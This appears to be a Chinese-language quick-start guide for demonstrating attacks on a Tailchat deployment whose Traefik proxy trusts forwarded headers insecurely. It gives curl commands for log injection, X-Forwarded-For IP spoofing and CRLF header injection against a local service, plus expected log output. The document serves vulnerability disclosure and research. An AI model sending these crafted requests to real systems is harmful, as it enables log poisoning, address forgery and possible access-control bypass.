# Tailchat 攻击演示 - 快速开始

## 🚀 快速开始（5 分钟演示）

### 1. 运行攻击演示脚本

```bash
cd /home/rui/ci/security_research
./scripts/exploit/exploit_tailchat_demo.sh
```

**脚本会自动：**
- ✅ 检查漏洞配置
- ✅ 验证 Traefik 配置
- ✅ 执行攻击
- ✅ 验证攻击结果

---

### 2. 手动攻击演示（如果服务未运行）

#### 步骤 1: 检查漏洞配置

```bash
cd vulnerable_repos_analysis/tailchat
cat docker-compose.yml | grep -A 2 "forwardedHeaders"
```

**应该看到：**
```yaml
- "--entryPoints.web.forwardedHeaders.insecure" # Not good
```

#### 步骤 2: 启动服务（可选）

```bash
cd vulnerable_repos_analysis/tailchat
docker-compose up -d traefik
```

#### 步骤 3: 执行攻击

```bash
# 攻击 1: 日志注入
curl -v -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Injected-Header: TAILCHAT-ATTACK" \
     http://localhost:11000/

# 攻击 2: IP 欺骗
curl -H "X-Forwarded-For: 192.168.1.100" \
     http://localhost:11000/

# 攻击 3: CRLF 注入
curl -H "X-Forwarded-For: 127.0.0.1%0D%0AX-Log-Injection: CRLF" \
     http://localhost:11000/
```

#### 步骤 4: 验证攻击结果

```bash
# 检查日志
docker-compose logs service-core | grep -i "forwarded\|injected"
```

---

## 📊 攻击结果示例

### 成功的攻击会看到：

```
[2025-12-28 10:00:00] IP: 127.0.0.1
X-Injected-Header: TAILCHAT-ATTACK
X-Forwarded-Proto: https
```

---

## 🎯 关键点

1. **攻击门槛极低**: 只需能发送 HTTP 请求
2. **无需身份验证**: 不需要任何账户
3. **影响严重**: 可以污染日志、伪造 IP、可能绕过访问控制
4. **高星项目**: 3,491 stars，可能被广泛使用

---

## 📚 详细文档

- **完整演示**: `docs/demos/TAILCHAT_ATTACK_DEMO.md`
- **攻击脚本**: `scripts/exploit/exploit_tailchat_demo.sh`
- **CVE 报告**: `vulnerable_repos_analysis/cve_reports/CVE-2025-XXXXX-tailchat.md`

